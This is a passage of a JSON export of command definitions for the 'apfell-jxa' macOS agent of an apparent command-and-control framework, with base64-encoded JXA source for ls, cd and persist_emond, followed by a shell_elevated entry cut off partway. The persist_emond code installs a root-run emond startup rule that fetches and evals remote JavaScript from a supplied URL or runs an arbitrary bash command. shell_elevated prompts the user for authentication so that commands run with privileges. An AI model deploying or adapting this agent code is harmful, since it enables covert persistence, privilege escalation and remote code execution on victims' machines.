CB9CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydzaXplJ10gPSBhdHRyWydOU0ZpbGVTaXplJ107CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuc3Bvc2l4ID0gYXR0clsnTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddOwogICAgICAgICAgICAgICAgICAgICAgICAvLyB3ZSBuZWVkIHRvIGZpeCB0aGlzIG1lc3MgdG8gYWN0dWFsbHkgYmUgcmVhbCBwZXJtaXNzaW9uIGJpdHMgdGhhdCBtYWtlIHNlbnNlCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydwZXJtaXNzaW9ucyddID0gKChuc3Bvc2l4ID4+IDYpICYgMHg3KS50b1N0cmluZygpICsgKChuc3Bvc2l4ID4+IDMpICYgMHg3KS50b1N0cmluZygpICsgKG5zcG9zaXggJiAweDcpLnRvU3RyaW5nKCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfYWRkWydvd25lciddID0gYXR0clsnTlNGaWxlT3duZXJBY2NvdW50TmFtZSddICsgIigiICsgYXR0clsnTlNGaWxlT3duZXJBY2NvdW50SUQnXSArICIpIjsKICAgICAgICAgICAgICAgICAgICAgICAgZmlsZV9hZGRbJ2dyb3VwJ10gPSBhdHRyWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXSArICIoIiArIGF0dHJbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50SUQnXSArICIpIjsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJbJ05TRmlsZUV4dGVuc2lvbkhpZGRlbiddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2FkZFsnaGlkZGVuJ10gPSAiWSI7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX2FkZFsnaGlkZGVuJ10gPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBmaWxlc19kYXRhLnB1c2goZmlsZV9hZGQpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBhdHRyaWJ1dGVzWydmaWxlcyddID0gZmlsZXNfZGF0YTsKICAgICAgICAgICAgICAgIH1lbHNlewoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBkZWxldGUgYXR0cmlidXRlc1snTlNGaWxlU3lzdGVtRmlsZU51bWJlciddOwogICAgICAgICAgICBkZWxldGUgYXR0cmlidXRlc1snTlNGaWxlU3lzdGVtTnVtYmVyJ107CiAgICAgICAgICAgIGRlbGV0ZSBhdHRyaWJ1dGVzWydOU0ZpbGVUeXBlJ107CiAgICAgICAgICAgIGxldCBuc3Bvc2l4ID0gYXR0cmlidXRlc1snTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddOwogICAgICAgICAgICAvLyB3ZSBuZWVkIHRvIGZpeCB0aGlzIG1lc3MgdG8gYWN0dWFsbHkgYmUgcmVhbCBwZXJtaXNzaW9uIGJpdHMgdGhhdCBtYWtlIHNlbnNlCiAgICAgICAgICAgIGRlbGV0ZSBhdHRyaWJ1dGVzWydOU0ZpbGVQb3NpeFBlcm1pc3Npb25zJ107CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ25hbWUnXSA9IHBhdGg7CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ3NpemUnXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZVNpemUnXTsKICAgICAgICAgICAgYXR0cmlidXRlc1sncGVybWlzc2lvbnMnXSA9ICgobnNwb3NpeCA+PiA2KSAmIDB4NykudG9TdHJpbmcoKSArICgobnNwb3NpeCA+PiAzKSAmIDB4NykudG9TdHJpbmcoKSArIChuc3Bvc2l4ICYgMHg3KS50b1N0cmluZygpOzsKICAgICAgICAgICAgYXR0cmlidXRlc1snb3duZXInXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudE5hbWUnXSArICIoIiArIGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudElEJ10gKyAiKSI7CiAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ2dyb3VwJ10gPSBhdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXSArICIoIiArIGF0dHJpYnV0ZXNbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50SUQnXSArICIpIjsKICAgICAgICAgICAgaWYgKGF0dHJpYnV0ZXNbJ05TRmlsZUV4dGVuc2lvbkhpZGRlbiddKSB7CiAgICAgICAgICAgICAgICBhdHRyaWJ1dGVzWydoaWRkZW4nXSA9ICJZIjsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGF0dHJpYnV0ZXNbJ2hpZGRlbiddID0gIiI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZVNpemUnXTsKICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudE5hbWUnXTsKICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudElEJ107CiAgICAgICAgICAgIGRlbGV0ZSBhdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXTsKICAgICAgICAgICAgZGVsZXRlIGF0dHJpYnV0ZXNbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50SUQnXTsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiBKU09OLnN0cmluZ2lmeShhdHRyaWJ1dGVzLCBudWxsLCA2KSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIH1lbHNlewogICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgInVzZXJfb3V0cHV0IjogIkZhaWxlZCB0byBnZXQgYXR0cmlidXRlcyBvZiBmaWxlLiBGaWxlIGRvZXNuJ3QgZXhpc3Qgb3IgeW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byByZWFkIGl0IiwKICAgICAgICAgICAgICAgICJjb21wbGV0ZWQiOiB0cnVlLAogICAgICAgICAgICAgICAgInN0YXR1cyI6ICJlcnJvciIKICAgICAgICAgICAgfTsKICAgICAgICB9CgogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4gewogICAgICAgICAgICAidXNlcl9vdXRwdXQiOiAiRXJyb3I6ICIgKyBlcnJvci50b1N0cmluZygpLAogICAgICAgICAgICAiY29tcGxldGVkIjogdHJ1ZSwKICAgICAgICAgICAgInN0YXR1cyI6ICJlcnJvciIKICAgICAgICB9OwogICAgfQp9OwpDT01NQU5EX0VORFNfSEVSRQ=="
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "path",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "ls",
              "command_id": 36,
              "payload_type": "apfell-jxa",
              "transform": "jsonSingleParameter",
              "parameter_type": "String"
            }
          ],
          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsKCWlmKHRhc2suc3RhdHVzID09PSAnZXJyb3InKXsKCQlyZXR1cm4gIjxwcmU+IEVycm9yOiB1bnRvZ2dsZSBmb3IgZXJyb3IgbWVzc2FnZShzKSA8L3ByZT4iOwoJfQogIGxldCByb3dzID0gW107CiAgdHJ5ewogIAlmb3IobGV0IGkgPSAwOyBpIDwgcmVzcG9uc2VzLmxlbmd0aDsgaSsrKXsKICAgICAgICBsZXQgZGF0YSA9IEpTT04ucGFyc2UocmVzcG9uc2VzW2ldWydyZXNwb25zZSddKTsKICAgICAgICBsZXQgcm93X3N0eWxlID0gIiI7CgkJbGV0IGNlbGxfc3R5bGUgPSB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsICJ0eXBlIjoidGV4dC1hbGlnbjpjZW50ZXIifTsKCSAgICByb3dzLnB1c2goeyJuYW1lIjogZGF0YVsnbmFtZSddLAogICAgICAgICAgICAgICAgICAgInNpemUiOiBkYXRhWydzaXplJ10sCiAgICAgICAgICAgICAgICAgICAicGVybWlzc2lvbnMiOiBkYXRhWydwZXJtaXNzaW9ucyddLAogICAgICAgICAgICAgICAgICAgIm93bmVyIjogZGF0YVsnb3duZXInXSwKICAgICAgICAgICAgICAgICAgICJncm91cCI6IGRhdGFbJ2dyb3VwJ10sCiAgICAgICAgICAgICAgICAgICAidHlwZSI6IGRhdGFbJ3R5cGUnXSwKICAgICAgICAgICAgICAgICAgICJ4YXR0ciI6ICIiLAogICAgICAgICAgICAgICAgICAgInJvdy1zdHlsZSI6IHJvd19zdHlsZSwKICAgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjogY2VsbF9zdHlsZQogICAgICAgIH0pOwoJICAgIGlmKCFkYXRhLmhhc093blByb3BlcnR5KCdmaWxlcycpKXtkYXRhWydmaWxlcyddID0gW119OwoJICAgIGRhdGFbJ2ZpbGVzJ10uZm9yRWFjaChmdW5jdGlvbihyKXsKICAgIAkJbGV0IHJvd19zdHlsZSA9ICIiOwogICAgCQkvL2lmKHJbJ25hbWUnXS5pbmNsdWRlcygiLnNoIikpe3Jvd19zdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpyZWQ7Y29sb3I6d2hpdGUifQogICAgCQlpZihyLmhhc093blByb3BlcnR5KCdFeHRlbmRlZEF0dHJpYnV0ZXMnKSl7CiAgICAJCQlyWyd4YXR0ciddID0gT2JqZWN0LmtleXMoclsnRXh0ZW5kZWRBdHRyaWJ1dGVzJ10pLmpvaW4oIjxicj4iKTsKICAgIAkJfWVsc2V7CiAgICAJCQlyWyd4YXR0ciddID0gIiI7CiAgICAJCX0KCQkgICAgcm93cy5wdXNoKHsibmFtZSI6IHJbJ25hbWUnXSwKCSAgICAgICAgICAgICAgICAgICAic2l6ZSI6IHJbJ3NpemUnXSwKCSAgICAgICAgICAgICAgICAgICAicGVybWlzc2lvbnMiOiByWydwZXJtaXNzaW9ucyddLAoJICAgICAgICAgICAgICAgICAgICJvd25lciI6IHJbJ293bmVyJ10sCgkgICAgICAgICAgICAgICAgICAgImdyb3VwIjogclsnZ3JvdXAnXSwKCSAgICAgICAgICAgICAgICAgICAidHlwZSI6IHJbJ3R5cGUnXSwKCSAgICAgICAgICAgICAgICAgICAieGF0dHIiOiByWyd4YXR0ciddLAoJICAgICAgICAgICAgICAgICAgICJyb3ctc3R5bGUiOiByb3dfc3R5bGUsCgkgICAgICAgICAgICAgICAgICAgImNlbGwtc3R5bGUiOiB7ImhpZGRlbiI6ICJ0ZXh0LWFsaWduOmNlbnRlciIsICJ0eXBlIjoidGV4dC1hbGlnbjpjZW50ZXIifQogICAgICAgICAgIH0pOwoJCX0pOwoJfQogICAgCXZhciBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJuYW1lIiwgInNpemUiOiIxMGVtIn0seyJuYW1lIjoic2l6ZSIsICJzaXplIjoiMmVtIn0sIHsibmFtZSI6InBlcm1pc3Npb25zIiwgInNpemUiOiIyZW0ifSx7Im5hbWUiOiJvd25lciIsInNpemUiOiIzZW0ifSAseyJuYW1lIjogImdyb3VwIiwgInNpemUiOiAiMmVtIn0gLHsibmFtZSI6InR5cGUiLCAic2l6ZSI6ICIxZW0ifSwgeyJuYW1lIjoieGF0dHIiLCAic2l6ZSI6ICIxZW0ifV0sIHJvd3MpOwogICAgCXJldHVybiBvdXRwdXQ7CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiAiPHByZT4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2VzWzBdWydyZXNwb25zZSddLCBudWxsLCAyKSArICI8L3ByZT4iOwogICAgfQp9"
        },
        {
          "needs_admin": false,
          "help_cmd": "cd [path]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Change the current working directory to another directory. No quotes are necessary and relative paths are fine",
          "cmd": "cd",
          "parameters": [
            {
              "type": "String",
              "hint": "path to change directory to",
              "choices": "",
              "required": true,
              "name": "path"
            }
          ],
          "attack": [
            {
              "t_num": "T1083",
              "attack_name": "File and Directory Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "cd.js": "ZXhwb3J0cy5jZCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IGNvbW1hbmRfcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgIGlmKCFjb21tYW5kX3BhcmFtcy5oYXNPd25Qcm9wZXJ0eSgncGF0aCcpKXtyZXR1cm4geyJ1c2VyX291dHB1dCI6ICJNaXNzaW5nIHBhdGggcGFyYW1ldGVyIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifX0KICAgICAgICBsZXQgZmlsZU1hbmFnZXIgPSAkLk5TRmlsZU1hbmFnZXIuZGVmYXVsdE1hbmFnZXI7CiAgICAgICAgbGV0IHN1Y2Nlc3MgPSBmaWxlTWFuYWdlci5jaGFuZ2VDdXJyZW50RGlyZWN0b3J5UGF0aChjb21tYW5kX3BhcmFtc1sncGF0aCddKTsKICAgICAgICBpZihzdWNjZXNzKXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiAiTmV3IGN3ZDogIiArIGZpbGVNYW5hZ2VyLmN1cnJlbnREaXJlY3RvcnlQYXRoLmpzLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIkZhaWxlZCB0byBjaGFuZ2UgZGlyZWN0b3J5IiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": [
            {
              "order": 1,
              "parameter": "path",
              "active": true,
              "description": "",
              "timestamp": "05\/07\/2020 07:01:49",
              "command": "cd",
              "command_id": 37,
              "payload_type": "apfell-jxa",
              "transform": "jsonSingleParameter",
              "parameter_type": "String"
            }
          ]
        },
        {
          "needs_admin": true,
          "help_cmd": "persist_emond",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Create persistence with an emond plist file in \/etc\/emond.d\/rules\/ and a .DS_Store file to trigger it",
          "cmd": "persist_emond",
          "parameters": [
            {
              "type": "String",
              "hint": "Rule name for inside of the plist",
              "choices": "",
              "required": true,
              "name": "rule_name"
            },
            {
              "type": "Choice",
              "hint": "",
              "choices": "oneliner-jxa\ncustom_bash-c",
              "required": true,
              "name": "payload_type"
            },
            {
              "type": "String",
              "hint": "url of payload for oneliner-jxa",
              "choices": "",
              "required": false,
              "name": "url"
            },
            {
              "type": "String",
              "hint": "Command if type is custom_bash-c",
              "choices": "",
              "required": false,
              "name": "command"
            },
            {
              "type": "String",
              "hint": "Name of plist in \/etc\/emond.d\/rules\/",
              "choices": "",
              "required": true,
              "name": "file_name"
            }
          ],
          "attack": [
            {
              "t_num": "T1150",
              "attack_name": "Plist Modification"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "persist_emond.js": "ZXhwb3J0cy5wZXJzaXN0X2Vtb25kID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIHRyeXsKICAgICAgICAvL2Vtb25kIHBlcnNpc3RlbmNlIGZyb20gaHR0cHM6Ly93d3cueG9ycmlvci5jb20vZW1vbmQtcGVyc2lzdGVuY2UvCiAgICAgICAgbGV0IGNvbmZpZyA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICAvLyByZWFkICIvU3lzdGVtL0xpYnJhcnkvTGF1bmNoRGFlbW9ucy9jb20uYXBwbGUuZW1vbmQucGxpc3QiIGZvciB0aGUgIlF1ZXVlRGlyZWN0b3JpZXMiIGtleSAocmV0dXJucyBhcnJheSkKICAgICAgICAvLyBjcmVhdGUgIi5EU19TdG9yZSIgZmlsZSB0aGVyZSB0aGF0J3MgZW1wdHkKICAgICAgICAvLyBjcmVhdGUgbmV3IHBsaXN0IGluICIvZXRjL2Vtb25kLmQvcnVsZXMvIgogICAgICAgIGxldCBydWxlX25hbWUgPSAidXBkYXRlX2ZpbGVzIjsKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ3J1bGVfbmFtZScpICYmIGNvbmZpZ1sncnVsZV9uYW1lJ10gIT09ICIiKXtydWxlX25hbWUgPSBjb25maWdbJ3J1bGVfbmFtZSddO30KICAgICAgICBsZXQgcGF5bG9hZF90eXBlID0gIm9uZWxpbmVyLWp4YSI7CiAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCdwYXlsb2FkX3R5cGUnKSAmJiBjb25maWdbJ3BheWxvYWRfdHlwZSddICE9PSAiIil7cGF5bG9hZF90eXBlID0gY29uZmlnWydwYXlsb2FkX3R5cGUnXTt9CiAgICAgICAgaWYocGF5bG9hZF90eXBlID09PSAib25lbGluZXItanhhIil7CiAgICAgICAgICAgIGlmKGNvbmZpZy5oYXNPd25Qcm9wZXJ0eSgndXJsJykgJiYgY29uZmlnWyd1cmwnXSAhPT0gIiIpe3ZhciB1cmwgPSBjb25maWdbJ3VybCddO30KICAgICAgICAgICAgZWxzZXsgcmV0dXJuICJVUkwgaXMgcmVxdWlyZWQgZm9yIHRoZSBvbmVsaW5lci1qeGEgcGF5bG9hZF90eXBlIjsgfQogICAgICAgICAgICB2YXIgY29tbWFuZCA9ICJldmFsKE9iakMudW53cmFwKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcoJC5OU0RhdGEuZGF0YVdpdGhDb250ZW50c09mVVJMKCQuTlNVUkwuVVJMV2l0aFN0cmluZygnIiArCiAgICAgICAgICAgIHVybCArICInKSksJC5OU1VURjhTdHJpbmdFbmNvZGluZykpKSI7CiAgICAgICAgICAgIC8vIG5vdyB3ZSBuZWVkIHRvIGJhc2U2NCBlbmNvZGUgb3VyIGNvbW1hbmQKICAgICAgICAgICAgdmFyIGNvbW1hbmRfZGF0YSA9ICQoY29tbWFuZCkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU0RhdGEuTlNVVEYxNlN0cmluZ0VuY29kaW5nKTsKICAgICAgICAgICAgdmFyIGJhc2U2NF9jb21tYW5kID0gY29tbWFuZF9kYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICAgICAgdmFyIGZ1bGxfY29tbWFuZCA9ICJlY2hvIFwiIiArIGJhc2U2NF9jb21tYW5kICsgIlwiIHwgYmFzZTY0IC1EIHwgL3Vzci9iaW4vb3Nhc2NyaXB0IC1sIEphdmFTY3JpcHQgJmFtcDsiOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmKHBheWxvYWRfdHlwZSA9PT0gImN1c3RvbV9iYXNoLWMiKXsKICAgICAgICAgICAgaWYoY29uZmlnLmhhc093blByb3BlcnR5KCdjb21tYW5kJykgJiYgY29uZmlnWydjb21tYW5kJ10gIT09ICIiKXt2YXIgZnVsbF9jb21tYW5kID0gY29uZmlnWydjb21tYW5kJ107fQogICAgICAgICAgICBlbHNlewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ImNvbW1hbmQgaXMgYSByZXF1aXJlZCBmaWVsZCBmb3IgdGhlIGN1c3RvbV9iYXNoLWMgcGF5bG9hZF90eXBlIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAvLyBnZXQgb3VyIG5ldyBwbGlzdCBmaWxlX25hbWUKICAgICAgICBpZihjb25maWcuaGFzT3duUHJvcGVydHkoJ2ZpbGVfbmFtZScpICYmIGNvbmZpZ1snZmlsZV9uYW1lJ10gIT09ICIiKXsgdmFyIGZpbGVfbmFtZSA9IGNvbmZpZ1snZmlsZV9uYW1lJ107fQogICAgICAgIGVsc2V7IHJldHVybiB7InVzZXJfb3V0cHV0IjoiZmlsZSBuYW1lIGlzIHJlcXVpcmVkIiwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsgfQoKICAgICAgICB2YXIgcGxpc3RfY29udGVudHMgPSAiPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwiVVRGLThcIj8+XG4iICsKICAgICI8IURPQ1RZUEUgcGxpc3QgUFVCTElDIFwiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOXCIgXCJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkXCI+XG4iICsKICAgICI8cGxpc3QgdmVyc2lvbj1cIjEuMFwiPlxuIiArCiAgICAiPGFycmF5PlxuIiArCiAgICAiCTxkaWN0PlxuIiArCiAgICAiCQk8a2V5Pm5hbWU8L2tleT5cbiIgKwogICAgIgkJPHN0cmluZz4iICsgcnVsZV9uYW1lICsgIjwvc3RyaW5nPlxuIiArCiAgICAiCQk8a2V5PmVuYWJsZWQ8L2tleT5cbiIgKwogICAgIgkJPHRydWUvPlxuIiArCiAgICAiCQk8a2V5PmV2ZW50VHlwZXM8L2tleT5cbiIgKwogICAgIgkJPGFycmF5PlxuIiArCiAgICAiCQkJPHN0cmluZz5zdGFydHVwPC9zdHJpbmc+XG4iICsKICAgICIJCTwvYXJyYXk+XG4iICsKICAgICIJCTxrZXk+YWN0aW9uczwva2V5PlxuIiArCiAgICAiCQk8YXJyYXk+XG4iICsKICAgICIJCQk8ZGljdD5cbiIgKwogICAgIgkJCQk8a2V5PmNvbW1hbmQ8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPi9iaW4vc2xlZXA8L3N0cmluZz5cbiIgKwogICAgIgkJCQk8a2V5PnVzZXI8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPnJvb3Q8L3N0cmluZz5cbiIgKwogICAgIgkJCQk8a2V5PmFyZ3VtZW50czwva2V5PlxuIiArCiAgICAiCQkJCTxhcnJheT5cbiIgKwogICAgIgkJCQkJPHN0cmluZz42MDwvc3RyaW5nPlxuIiArCiAgICAiCQkJCTwvYXJyYXk+XG4iICsKICAgICIJCQkJPGtleT50eXBlPC9rZXk+XG4iICsKICAgICIJCQkJPHN0cmluZz5SdW5Db21tYW5kPC9zdHJpbmc+XG4iICsKICAgICIJCQk8L2RpY3Q+XG4iICsKICAgICIJCQk8ZGljdD5cbiIgKwogICAgIgkJCQk8a2V5PmNvbW1hbmQ8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPi9iaW4vYmFzaDwvc3RyaW5nPlxuIiArCiAgICAiCQkJCTxrZXk+dXNlcjwva2V5PlxuIiArCiAgICAiCQkJCTxzdHJpbmc+cm9vdDwvc3RyaW5nPlxuIiArCiAgICAiCQkJCTxrZXk+YXJndW1lbnRzPC9rZXk+XG4iICsKICAgICIJCQkJPGFycmF5PlxuIiArCiAgICAiCQkJCQk8c3RyaW5nPi1jPC9zdHJpbmc+XG4iICsKICAgICIJCQkJCTxzdHJpbmc+ICIgKyBmdWxsX2NvbW1hbmQgKyAiPC9zdHJpbmc+XG4iICsKICAgICIJCQkJPC9hcnJheT5cbiIgKwogICAgIgkJCQk8a2V5PnR5cGU8L2tleT5cbiIgKwogICAgIgkJCQk8c3RyaW5nPlJ1bkNvbW1hbmQ8L3N0cmluZz5cbiIgKwogICAgIgkJCTwvZGljdD5cbiIgKwogICAgIgkJPC9hcnJheT5cbiIgKwogICAgIgk8L2RpY3Q+XG4iICsKICAgICI8L2FycmF5PlxuIiArCiAgICAiPC9wbGlzdD4iOwogICAgICAgIC8vIHJlYWQgdGhlIHBsaXN0IGZpbGUgYW5kIGNoZWNrIHRoZSBRdWV1ZURpcmVjdG9yaWVzIGZpZWxkCiAgICAgICAgdmFyIHByZWZzID0gT2JqQy5kZWVwVW53cmFwKCQuTlNNdXRhYmxlRGljdGlvbmFyeS5hbGxvYy5pbml0V2l0aENvbnRlbnRzT2ZGaWxlKCQoIi9TeXN0ZW0vTGlicmFyeS9MYXVuY2hEYWVtb25zL2NvbS5hcHBsZS5lbW9uZC5wbGlzdCIpKSk7CiAgICAgICAgLy9jb25zb2xlLmxvZyhKU09OLnN0cmluZ2lmeShwcmVmcykpOwogICAgICAgIHZhciBxdWV1ZURpcmVjdG9yaWVzID0gcHJlZnNbJ1F1ZXVlRGlyZWN0b3JpZXMnXTsKICAgICAgICBpZihxdWV1ZURpcmVjdG9yaWVzICE9PSB1bmRlZmluZWQgJiYgcXVldWVEaXJlY3Rvcmllcy5sZW5ndGggPiAwKXsKICAgICAgICAgICAgdmFyIHF1ZXVlRGlyZWN0b3J5UGF0aCA9IHF1ZXVlRGlyZWN0b3JpZXNbMF07CiAgICAgICAgICAgIHdyaXRlX2RhdGFfdG9fZmlsZSgiICIsIHF1ZXVlRGlyZWN0b3J5UGF0aCArICIvLkRTX1N0b3JlIik7CiAgICAgICAgICAgIC8vIG5vdyB0aGF0IHdlIGhhdmUgYSBmaWxlIGluIG91ciBxdWV1ZURpcmVjdG9yeSwgd2UgbmVlZCB0byB3cml0ZSBvdXQgb3VyIHBsaXN0CiAgICAgICAgICAgIHdyaXRlX2RhdGFfdG9fZmlsZShwbGlzdF9jb250ZW50cywgIi9ldGMvZW1vbmQuZC9ydWxlcy8iICsgZmlsZV9uYW1lKTsKCiAgICAgICAgICAgIHZhciB1c2VyX291dHB1dCA9ICJDcmVhdGVkICIgKyBxdWV1ZURpcmVjdG9yeVBhdGggKyAiLy5EU19TdG9yZSBhbmQgL2V0Yy9lbW9uZC5kL3J1bGVzLyIgKyBmaWxlX25hbWUgKyAiIHdpdGggY29udGVudHM6IFxuIiArIHBsaXN0X2NvbnRlbnRzOwoKICAgICAgICAgICAgLy8gYW5ub3VuY2Ugb3VyIGNyZWF0ZWQgYXJ0aWZhY3RzIGFuZCB1c2VyIG91dHB1dAogICAgICAgICAgICBsZXQgYXJ0aWZhY3RzID0geyd1c2VyX291dHB1dCc6IHVzZXJfb3V0cHV0LCAnYXJ0aWZhY3RzJzogW3snYmFzZV9hcnRpZmFjdCc6ICdGaWxlIENyZWF0ZScsICdhcnRpZmFjdCc6IHF1ZXVlRGlyZWN0b3J5UGF0aCArICIvLkRTX1N0b3JlIn0sIHsnYmFzZV9hcnRpZmFjdCc6ICdGaWxlIENyZWF0ZScsICdhcnRpZmFjdCc6ICcvZXRjL2Vtb25kLmQvcnVsZXMvJyArIGZpbGVfbmFtZX1dLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgIHJldHVybiBhcnRpZmFjdHMKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJRdWV1ZURpcmVjdG9yaWVzIGFycmF5IGlzIGVpdGhlciBub3QgdGhlcmUgb3IgMCBpbiBsZW5ndGgiLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "shell_elevated",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "The command will pop a dialog box for the user asking for them to authenticate (fingerprint reader too) so that the command you entered will be executed in an elevated context. Alternatively, you can supply a username and password and the command will run under their context (assuming they have the right permissions). Once you successfully authenticate, you have a time window where no more popups will occur, but you'll still execute subsequent commands in an elevated context.\n\nWARNING! THIS IS SINGLE THREADED, IF YOUR COMMAND HANGS, THE AGENT HANGS!",
          "cmd": "shell_elevated",
          "parameters": [
            {
              "type": "String",
              "hint": "Command to execute",
              "choices": "",
              "required": true,
              "name": "command"
            },
            {
              "type": "Boolean",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "use_creds"
            },
            {
              "type": "Credential",
              "hint": "Username that you want to run as",
              "choices": "",
              "required": false,
              "name": "user"
            },
            {
              "type": "Credential",
              "hint": "The user's password",
              "choices": "",
              "required": false,
              "name": "credential"
            },
            {
              "type": "String",
